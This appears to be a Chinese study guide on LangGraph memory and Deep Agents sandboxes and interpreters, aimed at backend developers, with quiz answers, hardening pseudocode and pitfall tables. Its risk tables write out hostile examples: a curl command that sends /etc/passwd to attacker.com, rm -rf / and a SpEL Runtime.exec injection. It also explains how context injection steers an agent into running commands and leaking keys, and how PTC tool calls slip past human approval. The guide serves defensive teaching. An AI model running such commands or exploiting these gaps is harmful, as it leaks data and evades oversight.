**题1**：用户昨天在 thread-1 告诉 agent "我对花生过敏"，今天开 thread-2 问"推荐午餐"。用 checkpointer 能让 agent 记住过敏吗？为什么？正确做法是什么？
> 预判疑问："checkpointer 不也是持久化吗，为什么跨 thread 不行？"
> 答：不能。checkpointer 是 **thread-scoped** 🟢，thread_id 一换 checkpoint 完全隔离。正确做法是把"花生过敏"作为一条记忆写进 **Store**，namespace 带 user_id，thread-2 里用当前消息做 query 语义召回，塞进 system prompt。

**题2**：`store.search(("alice",), query=" pizza", limit=5)` 和 `store.search(("alice","memories"), query="pizza", limit=5)` 的结果范围有何不同？为什么生产里要小心？
> 预判疑问："namespace 不就是个路径吗，多一层少一层有啥区别？"
> 答：前者是**前缀匹配**，会返回 `("alice",)`、`("alice","memories")`、`("alice","secrets")` 等所有子 namespace 下的 item 🟢；后者只返回 `("alice","memories")` 这一层。生产里前者可能把 `secrets` 命名空间里的敏感记忆误召回，造成隐私泄露。要单层就传完整 namespace，或应用层按 `item.namespace` 二次过滤 🟢。

**题3**：你用 `InMemoryStore` 开发时记忆召回顺序是对的，上生产换成 `PostgresStore` 后顺序全乱了，为什么？怎么根治？
> 预判疑问："同一套 API 怎么换后端结果就不一样？"
> 答：两个后端**默认排序不同** 🟢：InMemoryStore 按插入序（最新在后），PostgresStore 按 `updated_at` 降序（最新在前）。官方明说"Do not rely on a specific order across implementations"。根治：**永远在应用层按 `item.value["updated_at"]` 自己 sort**，别信 store 默认序 🟢。

**题4**：万物云用 pgvector + similar merge + TTL。这三个里哪个是 LangGraph Store 官方内置功能、哪个是自己实现的？为什么 TTL 必须自己实现？
> 预判疑问："官方 Store 不是有 created_at/updated_at 吗，难道不能自动过期？"
> 答：**pgvector 向量检索**是官方 PostgresStore + `index` 配置支持的 🟢（底层 pgvector 🟡）；**similar merge** 是自己实现的业务逻辑（Store 只给 `put/get/search`，合并要自己写"先搜相似→决定合并还是新建"）🔴；**TTL 是自己实现的**，官方 Store **没有内置过期机制** 🔴。`created_at`/`updated_at` 只是时间戳字段，不会自动删数据。TTL 必须自己跑 cron，按 `updated_at + ttl_days` 判断过期并 `delete` 🟢（参考官方对 checkpointer 的"retention policy / cron job"建议，store 同理推断）。

**题5**：组织级合规政策要注入给所有用户的 agent，用 user-scoped store 写进每个用户 namespace 行不行？有什么安全风险？正确做法？
> 预判疑问："每个用户都存一份不就完了？"
> 答：技术上能跑，但有三个问题：(1) 冗余，改一次政策要更新所有用户；(2) **prompt injection 风险** 🟢——如果某用户能写自己 namespace 且 agent 读时不过滤来源，恶意用户可注入伪政策；(3) 一致性难保证。正确做法：用**独立的 org-scoped namespace**（如 `("org", "compliance")`）存政策，且设为**只读**（用 permissions 拒写，或只通过应用代码写），agent 读时额外召回这个 namespace 🟢。这等价于 Deep Agents 官方推荐的"Organization-level memory is typically read-only to prevent prompt injection via shared state" 🟢。万物云是否用了 org-scoped 只读记忆 🔴 待核，不编。

---

### 第27步：沙箱（Sandbox / Interpreter）
> 一句话定位：让 Agent 能跑代码/Shell 命令，但跑在一个跟宿主机隔离的"笼子"里，跑炸了也不烧到自家机器。🟢 Deep Agents 官方文档 sandboxes/interpreters 页确认；万物云用没用 = 🔴 待核（万物云没用 Deep Agents，本步基于 Deep Agents 官方文档讲，万物云口径见末尾）

---

#### 为什么重要（痛点先讲）

Agent 一旦要"真干活"——读用户的 Excel、装 pandas、跑 pytest、git clone 一个仓库、生成 PPT——它就必须**执行代码**。但 LLM 生成的代码你**完全无法预判**：

| 痛点 | 后果 | 类比你熟悉的 |
|---|---|---|
| LLM 写了 `os.remove("/")` 或 `rm -rf` | 把你生产服务器抹了 | 用户在你的 Spring 服务里传了个 SpEL 表达式 `T(Runtime).getRuntime().exec("rm -rf /")`，没沙箱就真执行了 |
| LLM 读 `~/.aws/credentials` 或 `.env` | 把你的云密钥泄露（自己读自己上传） | 用户在你接口里能读到 `System.getenv("DB_PASSWORD")` |
| LLM `curl http://attacker.com/$(cat /etc/passwd)` | 数据外泄（DNS/HTTP 通道） | 越权接口把数据 POST 到外部 |
| LLM 写死循环 `while True: pass` | CPU 100% 拖垮宿主机 | 一个 `@RequestMapping` 没限流被刷爆 |
| LLM `pip install` 装一堆大包 | 磁盘/内存爆 | Redis 不设 maxmemory 直接 OOM |
| LLM 把中间结果 100MB 写进上下文 | 上下文窗口爆，后面 turn 全废 | 一个 SseEmitter 不限流把 JVM 堆撑爆 |

**核心矛盾**：Agent 要"自由度"才能干活，但自由度 = 危险面。沙箱就是用"隔离边界"换"自由度"——笼子里随便炸，笼子外不感知。

第1-25步你学的 LangGraph 心智模型（StateGraph/Command/multi-agent/上下文工程）解决的是"Agent 怎么想、怎么流转、怎么记得住"，**没解决"Agent 怎么动手而不闯祸"**。本步补的就是这一层。

---

#### 概念（是啥）

Deep Agents 把"代码执行"分成**两条独立路径**，官方文档明确区分 🟢：

| 路径 | 是啥 | 暴露给 Agent 的工具 | 适合场景 |
|---|---|---|---|
| **Sandbox backend**（沙箱后端） | 一个**远程/独立**的执行环境（云 VM、容器、microVM），Agent 通过 API 把 shell 命令丢进去跑 | `execute` + 完整文件系统工具（`ls`/`read_file`/`write_file`/`edit_file`/`delete`/`glob`/`grep`） | 装 pip 包、跑 pytest、git clone、跑 Docker-in-Docker |
| **Interpreter**（解释器） | 一个**进程内**的 JavaScript 运行时（QuickJS），Agent 写 JS 代码丢进去 `eval` | `eval`（一个工具） | 循环/分支/重试、数据转换、编排多个工具调用（PTC）、fan-out 子 Agent |

**关键区别一句话**🟢：
> Sandboxes are a code-first way for **acting on an environment** (running commands, installing dependencies, editing files); interpreters are a code-first way for **composing tools, preserving state, and deciding what information should return to the model**.

后端类比：
- **Sandbox** ≈ 你在 Spring 服务里调一个独立的 Docker 容器跑 Python 脚本（RPC 到 worker）。容器有完整 OS、能装包、能联网（可关）。
- **Interpreter** ≈ Spring 里的 **SpEL（Spring Expression Language）** 或 Activiti 的 **Script Task**（用 JS/Groovy 跑一段表达式），跑在主进程内、无 IO、无网络、只算数和编排。或者类比 Nashorn/GraalVM 内嵌 JS 引擎。

---

#### 深入（机制/原理，带三色）

##### A. Sandbox backend 的核心契约：`execute()` 一个方法搞定一切 🟢

Deep Agents 沙箱后端只有一个**必须实现**的方法：

```
execute(command: str) -> ExecuteResult(output: str, exit_code: int, truncated: bool)
```

`BaseSandbox` 基类把所有文件工具（`read_file`/`write_file`/`ls`/`glob`/`grep`/`edit_file`/`delete`）**都用 `execute()` 拼出来**——比如 `read_file("/a/b.py")` 实际是 `execute("cat /a/b.py")` 这一类。🟢 官方原话：

> the only method a provider must implement is `execute()`... Every other filesystem operation is built on top of `execute()` by the BaseSandbox base class

**框架在每次模型调用前自动探测**：如果 backend 实现了 `SandboxBackendProtocol`，就把 `execute` 工具加进 Agent 的工具列表；否则过滤掉，Agent 永远看不到它。🟢

后端类比：这就像 Spring 的 `Repository<T, ID>` 接口——你只实现 `findById`，Spring Data 自动给你派生出 `findAll`/`count`/`exists`。`execute()` 是沙箱的"原子操作"，其他都是组合操作。

##### B. 官方支持的 6 类 Provider（云沙箱）🟢

| Provider | 包名 | 一句话 |
|---|---|---|
| **LangSmith Sandbox** | `langsmith[sandbox]` | LangChain 自家的托管沙箱，GCP/AWS 多区域 GA，不用第三方账号 |
| **Daytona** | `langchain-daytona` | 云开发环境（devbox），原生支持 git 操作 |
| **E2B** | `langchain-e2b` | 专为 AI 代码执行设计的 microVM，秒级启动 |
| **Modal** | `langchain-modal` | Serverless 容器平台，支持 `blockNetwork: true` 网络隔离 |
| **Runloop** | `langchain-runloop` | Devbox 平台 |
| **Vercel Sandbox** | `langchain-vercel-sandbox` | Vercel 家的隔离执行环境 |

外加两个：`AgentCore`（AWS Bedrock 的 code interpreter）、`NVIDIA OpenShell`。🟢

**本步重点对比的"四种方案"**（按你给的任务）：

| 方案 | 隔离强度 | 启动延迟 | 成本 | 适合 |
|---|---|---|---|---|
| **1. Deep Agents Sandbox（云 devbox 类：LangSmith/Daytona/Modal/Runloop/Vercel）** 🟢 | 强（独立 VM/容器） | 秒~十秒 | 按运行时长计费，闲时也花钱 | 长任务、需要 OS 文件系统、git clone |
| **2. E2B** 🟢 | 强（microVM，Firecracker 级） | 亚秒~秒 | 按 ms 计费，启动便宜 | 短任务、高频代码执行（写一段跑一段） |
| **3. Interpreter（QuickJS）** 🟢 | 弱（同进程内嵌 JS 引擎，无 OS 隔离） | 毫秒 | 几乎为零（占主进程内存） | 纯逻辑编排、循环/重试、数据转换，不需要 OS |
| **4. 本地 subprocess（DIY）** 🔴 | 看你自己实现：纯 `subprocess` 弱；Docker 强 | 毫秒~秒 | 自托管成本 | 数据不出内网、合规要求、不想依赖第三方 |

> 第 4 种官方文档没有"开箱即用"的本地后端 🟢（原话："Don't see your provider? You can implement your own sandbox backend. See Contributing a sandbox integration"）——意思是**协议允许你实现一个本地 Docker/subprocess 后端**，但没给你写好。所以"本地 subprocess 方案"= 🔴 你自己按 `SandboxBackendProtocol` 实现，官方没现成代码。

##### C. Interpreter（QuickJS）深入 🟢

QuickJS 是一个**轻量 JavaScript 引擎**（C 写的，几百 KB），通过 `quickjs-rs` 嵌进 Python 进程里跑。Agent 调 `eval` 工具，把 JS 代码作为字符串传进去，引擎返回**最后一个表达式的值** + `console.log`/`warn`/`error` 的捕获输出。

**默认能力表**🟢（这张表背下来）：

| 能力 | 默认有没有 | 怎么开 |
|---|---|---|
| JavaScript 执行 | ✅ 有 | 加 `CodeInterpreterMiddleware` |
| Top-level `await` | ✅ 有 | 直接用 Promise |
| `console.log/warn/error` 捕获 | ✅ 有 | `capture_console=False` 可关 |
| **调用 Agent 工具（PTC）** | ❌ 无 | 传 `ptc=["web_search"]` 白名单 |
| 文件系统访问 | ❌ 无 | 把文件系统工具加进 PTC 白名单 |
| 网络访问 | ❌ 无 | 暴露一个特定网络工具通过 PTC |
| 时钟/datetime | ❌ 无 | 暴露一个时间工具 |
| Shell 命令、pip 装、跑测试 | ❌ 无 | **用 sandbox backend，不是 interpreter** |

**关键安全点**🟢：QuickJS 是"capability-scoped"（按能力授权），**不是**"host-memory isolation"（宿主机内存隔离）。原话：
> Interpreter code runs in an embedded QuickJS context, not a separate VM or process... Treat interpreters as a capability-scoped execution layer, not a host-memory isolation boundary.

后端类比：QuickJS ≈ Spring SpEL——SpEL 默认能算数、能调 bean 方法，但**不能** `new File()`、不能联网（除非你给 `T(Runtime)` 这种反射入口）。SpEL 是"表达式层"不是"进程隔离层"。同理 QuickJS 是"JS 表达式层"，真要不信任代码，得扔到独立 worker 进程或容器里。

##### D. PTC（Programmatic Tool Calling，解释器的杀手锏）🟢

普通工具调用：模型一轮 emit 一批 tool_call，**这批是固定的**，没法"循环/重试/分支/把上一次结果喂下一次"——要这些必须再来一轮模型调用，且每个结果都进上下文。🟢

PTC 让 Agent **写 JS 代码**循环调工具，中间结果只在 QuickJS 内存里，**只有最终值回模型上下文**。例子（并行搜 3 个 topic，只返回合并结果）🟢：

```javascript
const topics = ["retrieval", "memory", "evaluation"];           // 3 个搜索词
const results = await Promise.all(                              // 并行发起
  topics.map((topic) => tools.webSearch({ query: `${topic} best practices 2025` }))
);
results.join("\n\n");                                            // 只把合并后的字符串返给模型
```

后端类比：PTC ≈ 在 Activiti 工作流里写一个 **Script Task**，脚本里能 `bean.method()` 调 Spring bean（白名单），中间变量在脚本上下文里，**只把最终结果 setVariable 回流程变量**。比"每个调用都走一个 Service Task + 一轮用户输入"省 token/省人工。

**PTC 两个坑**🟢：
1. **`interrupt_on` 审批对 PTC 调用不生效**（PTC 走中间件桥，不走正常 tool calling 路径）。所以 PTC 白名单 = 权限边界，**只白名单"安全"的工具**。
2. **PTC 调用计数有上限** `max_ptc_calls=256`（默认），防 Agent 写死循环刷工具。

##### E. Sandbox 的两种集成架构 🟢

| 模式 | Agent 跑在哪 | API key 放哪 | 优点 | 缺点 |
|---|---|---|---|---|
| **Agent in sandbox** | Agent 代码本身跑在沙箱容器里，外部通过 HTTP/WebSocket 通信 | **在沙箱内**（风险） | 镜像本地开发体验 | 改 Agent 逻辑要重打镜像；key 在沙箱里有泄露风险 |
| **Sandbox as tool**（**官方推荐**） | Agent 跑在你自己服务器，需要执行时调沙箱 API | **在宿主机**（安全） | 改 Agent 代码秒生效；key 不进沙箱；多沙箱可并行 | 每次 execute 有网络延迟 |

后端类比：Sandbox as tool ≈ 你的 Spring 主服务调一个独立的 Python-worker 微服务（通过 HTTP/RPC），主服务拿密钥，worker 只跑代码。Agent in sandbox ≈ 把整个 Spring 服务打成镜像跑在 K8s 里。

##### F. Sandbox 生命周期：thread-scoped vs assistant-scoped 🟢

| 作用域 | 一个沙箱给谁用 | 适合 |
|---|---|---|
| **thread-scoped**（默认） | 每个 conversation thread 一个沙箱，thread 结束就销毁 | 用户级任务，隔离要求高 |
| **assistant-scoped** | 同一个 assistant 所有 thread 共享一个沙箱 | 持久化的开发环境（装的包、clone 的仓库跨会话保留） |

**所有沙箱都要主动销毁**🟢：原话 "Sandboxes consume resources and cost money until they are shut down"。两种清理方式：
1. 调 `client.delete_sandbox(name)` 或 `sandbox.stop()` / `kill()` / `terminate()`（finally 块里）
2. **设 TTL**：`create_sandbox(idle_ttl_seconds=3600)` —— 闲 1 小时自动删 🟢

后端类比：thread-scoped ≈ Spring 的 `@Scope("prototype")` 或 `request` scope bean；assistant-scoped ≈ `@Scope("singleton")`。TTL ≈ Redis `EXPIRE` / `idle_timeout`。

##### G. 两个文件平面的区分（生产最容易踩的坑）🟢

| 平面 | 谁调用 | 走哪 | 用途 |
|---|---|---|---|
| **Agent 文件工具** | LLM 在执行中调用 | 都走 `execute()`（shell 命令） | Agent 自己读代码、写文件、跑命令 |
| **文件传输 API** | 你的应用代码 | 走 Provider 原生 API（不走 shell） | 启动前 seed 源码/数据；结束后取产物 |

API 形态🟢：
- `backend.upload_files([("/src/index.py", b"print('Hello')\n"), ...])` — 启动前塞文件
- `backend.download_files(["/output.txt"])` — 结束后取产物

后端类比：upload_files/download_files ≈ SFTP 上传/下载，或者 OSS `put_object`/`get_object`。和 Agent 在沙箱里 `cat`/`echo` 是两个通道。

##### H. Interpreter 的三种持久化 mode 🟢

| mode | 状态保留范围 | 类比 |
|---|---|---|
| `"thread"`（默认） | 跨 turn 保留（每 turn 结束 snapshot，下 turn 恢复） | Spring `session` scope |
| `"turn"` | 只在一个 turn 内多个 eval 之间保留，turn 结束清空 | Spring `request` scope |
| `"call"` | 每次 eval 都是全新 REPL | Spring `prototype` scope |

**Snapshot 限制**🟢：只保留**可序列化**数据。函数/类/不可序列化对象 restore 后**不可访问**，访问会抛 `Value for 'fn' was not restored because it is not serializable (type: function)`。后端类比：snapshot ≈ Java `Serializable`，**带 `transient` 字段或 Lambda 反序列化后会丢**。

**Snapshot 不回滚外部副作用**🟢：如果 JS 代码通过 PTC 调了工具（比如发了邮件），恢复 snapshot 不会"撤销邮件"，只恢复变量。类比：数据库事务回滚不撤销已发的 HTTP 请求。

---

#### 生产实战（伪代码 + 逐行解释，每行注释）

**场景**：你做一个"代码评审 Agent"——用户传一个 Python 文件，Agent 在沙箱里跑 `pytest`+`ruff`，把结果总结给用户。生产级要求：thread-scoped 沙箱、TTL 兜底、网络隔离、文件 seed、产物回收、异常清理。

##### 伪代码 1：thread-scoped 沙箱 + TTL + finally 清理（基于 LangSmithSandbox）🟢

```python
# ---- 生产级 thread-scoped 沙箱 ----
from deepagents import create_deep_agent                              # 1. 主入口
from deepagents.backends.langsmith import LangSmithSandbox            # 2. LangSmith 沙箱 backend
from langchain_core.runnables import RunnableConfig                   # 3. LangGraph 配置类型
from langsmith.sandbox import SandboxClient                           # 4. LangSmith 沙箱客户端

client = SandboxClient()                                              # 5. 创建客户端（读 LANGSMITH_API_KEY 环境变量）

async def code_review_agent(config: RunnableConfig):                  # 6. async graph factory：每个 thread 启动时调
    thread_id = config["configurable"]["thread_id"]                   # 7. 从 LangGraph config 取 thread_id（每个会话唯一）
    sandbox_name = f"review-{thread_id}"                              # 8. 用 thread_id 给沙箱起名（幂等：重连能找回）
    
    existing = [                                                      # 9. 查已有沙箱
        sb for sb in client.list_sandboxes()                          # 10. 列出所有
        if getattr(sb, "name", None) == sandbox_name                 # 11. 按名字过滤
    ]
    if existing:                                                      # 12. 已存在（用户中途断线重连）
        ls_sandbox = existing[0]                                      # 13. 复用，不新建
    else:
        ls_sandbox = client.create_sandbox(                           # 14. 新建
            name=sandbox_name,                                        # 15. 名字（保证幂等）
            idle_ttl_seconds=3600,                                    # 16. 🟢 TTL：闲置 1 小时自动删（兜底，防忘了 finally）
        )
    
    backend = LangSmithSandbox(sandbox=ls_sandbox)                    # 17. 包成 Deep Agents backend
    
    # ---- seed：把用户上传的文件塞进沙箱 ----
    backend.upload_files([                                            # 18. 🟢 走原生 API，不走 shell
        ("/workspace/user_code.py", user_code_bytes),                 # 19. 用户要评审的代码
        ("/workspace/requirements.txt", b"pytest\nruff\n"),           # 20. 依赖声明
    ])
    
    agent = create_deep_agent(                                        # 21. 创建 Agent
        model="anthropic:claude-sonnet-4-6",                          # 22. 模型
        backend=backend,                                              # 23. 注入沙箱 backend —— 自动加 execute 工具
        system_prompt=(                                               # 24. 系统提示
            "你是代码评审 Agent。"
            "先 `pip install -r /workspace/requirements.txt`，"
            "再跑 `pytest /workspace/ --tb=short` 和 `ruff check /workspace/`，"
            "最后总结失败的测试和 lint 错误。"
            "不要联网。"
        ),
    )
    return agent                                                      # 25. 返回装配好的 Agent

# ---- 业务调用 ----
async def review(user_code: bytes, thread_id: str):
    config = {"configurable": {"thread_id": thread_id}}               # 26. 包装 config
    agent = await code_review_agent(config)                           # 27. 拿到带沙箱的 Agent
    try:                                                              # 28. try/finally 保证清理
        result = await agent.ainvoke(                                 # 29. 异步跑
            {"messages": [{"role": "user", "content": "评审这份代码"}]},
            config=config,                                            # 30. 传 config（含 thread_id）
        )
        
        # ---- 取产物 ----
        files = agent.backend.download_files([                        # 31. 🟢 走原生 API 取报告
            "/workspace/report.md",
        ])
        report = files[0].content.decode() if files[0].content else ""
        return report, result["messages"][-1].content
    finally:                                                          # 32. 不管成功失败都清理
        client.delete_sandbox(f"review-{thread_id}")                  # 33. 🟢 主动销毁（TTL 是兜底，不能只靠它）
```

##### 伪代码 2：本地 subprocess/Docker 自实现沙箱（🔴 官方没现成，自己按协议实现）

```python
# ---- 自实现一个本地 Docker 沙箱 backend（满足 SandboxBackendProtocol）----
import subprocess                                                      # 1. 标准库
from dataclasses import dataclass                                      # 2. 数据类

@dataclass
class ExecuteResult:                                                   # 3. 🟢 协议要求的返回结构
    output: str                                                        # 4. stdout+stderr 合并
    exit_code: int                                                     # 5. 退出码
    truncated: bool = False                                            # 6. 是否被截断

class LocalDockerSandbox:                                              # 7. 自实现 backend
    """🔴 官方没给现成本地 backend；自己按协议实现"""
    
    def __init__(self, image: str = "python:3.11-slim",                # 8. 基础镜像
                 network: str = "none",                                # 9. 🟡 网络隔离：none=完全断网（自加，非协议要求）
                 mem_limit: str = "512m",                              # 10. 🟡 内存上限（Docker 原生）
                 cpus: str = "1.0",                                    # 11. 🟡 CPU 上限
                 timeout: int = 30):                                   # 12. 🟡 命令超时秒数
        self.image = image                                             # 13. 存配置
        self.network = network
        self.mem_limit = mem_limit
        self.cpus = cpus
        self.timeout = timeout
        self.container_id = self._start_container()                    # 14. 启动容器（构造时即起）
    
    def _start_container(self) -> str:
        cmd = [                                                        # 15. docker run 命令
            "docker", "run", "-d",                                     # 16. 后台跑
            "--network", self.network,                                 # 17. 🟡 断网（防数据外泄）
            "--memory", self.mem_limit,                                # 18. 🟡 内存限制（防 OOM 宿主机）
            "--cpus", self.cpus,                                       # 19. 🟡 CPU 限制（防死循环烧 CPU）
            "--read-only",                                             # 20. 🟡 根文件系统只读（防持久化恶意文件）
            "--tmpfs", "/tmp:rw,size=64m",                             # 21. 🟡 只给 /tmp 可写且限大小
            "--user", "65534:65534",                                   # 22. 🟡 用 nobody 跑（非 root）
            "--cap-drop", "ALL",                                       # 23. 🟡 删所有 Linux capabilities（防逃逸）
            "--security-opt", "no-new-privileges",                     # 24. 🟡 禁提权
            self.image, "sleep", "infinity",                           # 25. 启动后挂起
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)   # 26. 执行 docker run
        return result.stdout.strip()                                   # 27. 拿 container_id
    
    def execute(self, command: str) -> ExecuteResult:                  # 28. 🟢 协议唯一必须方法
        try:
            result = subprocess.run(                                   # 29. 在容器里跑命令
                ["docker", "exec", self.container_id, "bash", "-c", command],
                capture_output=True, text=True,
                timeout=self.timeout,                                  # 30. 🟡 超时（防死循环）
            )
            output = (result.stdout + result.stderr)                   # 31. 合并 stdout/stderr（🟢 协议要求）
            truncated = len(output) > 1_000_000                        # 32. 🟡 自己截断（防上下文爆）
            if truncated:
                output = output[:1_000_000] + "\n[truncated]"          # 33. 截断标记
            return ExecuteResult(                                      # 34. 返回协议结构
                output=output,
                exit_code=result.returncode,                           # 35. 退出码
                truncated=truncated,
            )
        except subprocess.TimeoutExpired:                              # 36. 超时
            return ExecuteResult(                                      # 37. 返回超时错误
                output=f"[timeout after {self.timeout}s]",
                exit_code=124,                                         # 38. 124=timeout 约定
            )
    
    def cleanup(self):                                                 # 39. 清理
        subprocess.run(                                                # 40. 强制删容器
            ["docker", "rm", "-f", self.container_id],
            capture_output=True,
        )

# ---- 用法 ----
backend = LocalDockerSandbox(                                          # 41. 起一个本地沙箱
    image="python:3.11-slim",
    network="none",                                                    # 42. 断网
    mem_limit="512m",
    timeout=30,
)
try:
    agent = create_deep_agent(model="...", backend=backend)            # 43. 当 backend 用（协议兼容）
    agent.invoke({"messages": [...]})
finally:
    backend.cleanup()                                                  # 44. 主动删容器
```

> **注意**🔴：上面这个 `LocalDockerSandbox` 是**我自己按官方协议写的示意**，不是官方代码。官方明确说"implement your own sandbox backend. See Contributing a sandbox integration"——意思是你照着 `SandboxBackendProtocol` 实现就行，但官方仓库没有这个类。所以标 🔴。

##### 伪代码 3：Interpreter + PTC 编排多个工具（省 token）🟢

```python
# ---- 用 QuickJS interpreter 编排 N 个搜索，只把合并结果回模型 ----
from deepagents import create_deep_agent
from langchain_quickjs import CodeInterpreterMiddleware                # 1. QuickJS 中间件

agent = create_deep_agent(
    model="anthropic:claude-sonnet-4-6",
    tools=[web_search, fetch_page],                                    # 2. 正常注册工具
    middleware=[
        CodeInterpreterMiddleware(
            ptc=["web_search"],                                        # 3. 🟢 PTC 白名单：只放 web_search（不放 fetch_page，最小权限）
            memory_limit=32 * 1024 * 1024,                             # 4. 🟢 32MB 堆（默认 64MB，按需调小）
            timeout=10.0,                                              # 5. 🟢 每次 eval 上限 10s（默认 5s）
            max_ptc_calls=100,                                         # 6. 🟢 最多 100 次工具调用（默认 256，按需调小）
            max_result_chars=2000,                                     # 7. 🟢 返给模型的结果截断到 2000 字符
            mode="turn",                                               # 8. 🟢 只在当前 turn 内保留状态（不跨 turn，省内存）
        ),
    ],
)

# Agent 内部会写类似这样的 JS（你看不到，模型生成）：
# const topics = ["a","b","c","d","e"];
# const results = await Promise.all(topics.map(t => tools.webSearch({query: t})));
# results.join("\n---\n");  // 只把这一行返给模型，5 个搜索结果不进上下文
```

---

#### 生产注意（坑 + 对策，表格或列表）

##### 沙箱四大坑（按官方安全章节整理）🟢

| 坑 | 描述 | 对策 |
|---|---|---|
| **逃逸（Context Injection）** | 攻击者控制部分 Agent 输入，指示它在沙箱里跑任意命令。沙箱**隔离宿主机**，但**不隔离 Agent 在沙箱内的行为**——Agent 在沙箱里有完整 shell 权限。 | ① 把沙箱当"半信任"环境 ② 对所有 execute 调用开 HITL 审批 ③ 沙箱输出当不可信输入 ④ 用中间件过滤敏感模式 |
| **网络外泄** | 上下文注入的 Agent 在沙箱里 `curl http://attacker.com/$(cat /etc/passwd)` 把数据发出去。沙箱默认**不隔离网络**（除非你显式关）。 | ① 不用时关网络（Modal `blockNetwork: true`；本地 Docker `--network none`）② 监控出站流量 ③ 用 Auth Proxy 注入密钥而非塞进沙箱 |
| **密钥泄露** | 把 API key/token 通过环境变量、挂载文件、`secrets=` 注入沙箱——上下文注入的 Agent 能读出来外泄。**官方原话**🟢："Never put secrets inside a sandbox." | ① 密钥留在宿主机的工具里（推荐）② 用 Auth Proxy 拦截出站请求自动加 Authorization 头 ③ 必须注入时：最短 TTL + 最小权限 + 全工具 HITL + 限网络 |
| **资源耗尽** | LLM 写死循环烧 CPU、`pip install` 装一堆包撑爆磁盘、生成 100MB 文件占满内存。 | ① `--memory`/`--cpus`（Docker）② `idle_ttl_seconds`（云沙箱）③ Interpreter 用 `memory_limit`/`timeout`/`max_ptc_calls` ④ 大输出自动落盘 + `read_file` 增量读 🟢 |

##### Interpreter 特有的坑 🟢

| 坑 | 描述 | 对策 |
|---|---|---|
| **当全功能沙箱用** | QuickJS 默认无文件/网络/shell，有人误以为它"安全跑任意代码"。它是**能力受限**不是**进程隔离**。 | 不信任代码就别用 interpreter，用 sandbox backend，或独立 worker 进程 |
| **PTC 绕过 HITL** | `interrupt_on` 审批对 PTC 调用**不生效**🟢。如果你 PTC 白名单放了 `delete_file`，Agent 能在 JS 里循环删文件，HITL 不拦。 | PTC 白名单**只放安全/幂等/便宜**的工具（如 `web_search`），危险工具（`delete`/`send_email`/`execute`）**绝不放 PTC** |
| **Snapshot 不回滚副作用** | mode="thread" 恢复变量，但已发的邮件/已写的数据**不撤销**🟢。 | PTC 调用的工具最好是**只读或可重试**的；有副作用的工具在 PTC 外走正常路径+HITL |
| **函数不可序列化** | snapshot 后函数/类对象 restore 失败，访问抛错🟢。 | 跨 turn 只存**数据**（JSON 可序列化的），不存函数；逻辑每 turn 重建 |
| **`max_ptc_calls=None` 滥用** | 文档说"Set to None only in trusted environments"🟢。有人图省事设 None。 | 保留默认 256 或调更小，**永远设上限** |

##### Sandbox 生命周期坑 🟢

| 坑 | 描述 | 对策 |
|---|---|---|
| **沙箱不主动删，钱烧光** | 沙箱起就一直计费，到 TTL 才停🟢。 | ① `finally` 块必删 ② 设 `idle_ttl_seconds` 兜底 ③ 监控告警 |
| **assistant-scoped 状态膨胀** | 共享沙箱里装的包、clone 的仓库、生成的文件一直累积🟢。 | ① 定期用 snapshot 重置 ② 实现清理逻辑 ③ 监控磁盘 |
| **重连不幂等** | 用户中途断线重连，又起一个新沙箱，旧的孤儿了。 | 沙箱名用 `thread_id` 命名（伪代码 1 第 8 行），先 `list_sandboxes` 查重 🟢 |
| **文件传输走错通道** | 想用 `cat > file` 在 shell 里塞大文件，结果命令行长度爆 / 转义爆。 | 用 `upload_files()`/`download_files()` 原生 API，**不走 shell** 🟢 |

##### 镜像膨胀坑（agent-in-sandbox 模式）🟢

| 坑 | 描述 | 对策 |
|---|---|---|
| **改 Agent 逻辑要重打镜像** | agent-in-sandbox 模式把 Agent 代码打进 Docker 镜像，改一行代码要 rebuild。 | 用 sandbox-as-tool 模式（Agent 在宿主机，沙箱只跑代码）🟢 |
| **镜像越打越大** | `pip install` 累积、缓存没清。 | 多阶段构建 + `.dockerignore` + `--no-cache-dir` |

---

#### 后端类比（表格：Agent概念 | 后端类比(Spring/Activiti/Redis/JUC) | 说明）

| Agent 概念 | 后端类比 | 说明 |
|---|---|---|
| Sandbox backend（云沙箱） | 独立 Docker 容器 / K8s Pod / 远程 worker 微服务 | 完整 OS、独立进程、可联网可断网，主服务通过 RPC 调 |
| Interpreter（QuickJS） | Spring SpEL / Activiti Script Task（JS/Groovy）/ Nashorn | 进程内表达式引擎，无 IO 无网络，只算数+编排 |
| `execute()` 方法 | `Runtime.exec()` / `ProcessBuilder` / SSH 到 worker 跑命令 | 沙箱唯一的原子操作，其他文件工具都基于它组合 |
| `SandboxBackendProtocol` | Spring `Repository<T,ID>` 接口 / JDBC `Driver` 接口 | 你实现一个方法，框架自动派生其他能力 |
| thread-scoped 沙箱 | Spring `@Scope("request")` / `@Scope("prototype")` bean | 每请求/每会话一个，用完销毁 |
| assistant-scoped 沙箱 | Spring `@Scope("singleton")` bean / `@ApplicationScope` | 全应用共享，状态累积 |
| `idle_ttl_seconds` | Redis `EXPIRE` / `idleTimeout`（连接池）/ `@Scheduled` 清理 | 闲置 N 秒自动清理，兜底防泄露 |
| `upload_files`/`download_files` | SFTP 上传下载 / OSS `put_object`/`get_object` | 走原生 API 通道，不走 shell |
| Sandbox as tool 模式 | 主服务调 Python-worker 微服务（HTTP/RPC），密钥在主服务 | 推荐：密钥不进沙箱，改 Agent 逻辑秒生效 |
| Agent in sandbox 模式 | 整个 Spring 服务打包成镜像跑 K8s | 不推荐：改逻辑要重打镜像，密钥在容器内 |
| Context injection | SQL 注入 / SpEL 注入 / LDAP 注入 | 用户输入控制了 Agent 行为，沙箱防不住，要从输入校验+HITL 拦 |
| 网络外泄 | 越权接口把数据 POST 到外部 / SSRF | 关网络或监控出站 |
| PTC 白名单 | Spring Security `@PreAuthorize` / Shiro 权限注解 / 方法级 ACL | 最小权限：只白名单安全工具 |
| PTC 绕过 HITL | `@PreAuthorize` 拦不住内部 `method()` 调用（绕过代理） | 危险工具不放 PTC，只走有代理拦截的路径 |
| `memory_limit`（QuickJS 64MB） | JVM `-Xmx` / Docker `--memory` | 堆内存上限 |
| `timeout`（QuickJS 5s） | `@Transactional(timeout=...)` / `RestTemplate.setReadTimeout` | 单次操作超时 |
| `max_ptc_calls=256` | Redis 令牌桶限流 / Sentinel QPS 限流 | 防死循环刷工具 |
| Snapshot mode="thread" | Spring `@SessionScope` / HttpSession 序列化 | 跨请求保留状态 |
| Snapshot 不回滚副作用 | 数据库事务回滚不撤销已发 HTTP 请求 | 一致性边界只覆盖变量，不覆盖外部世界 |
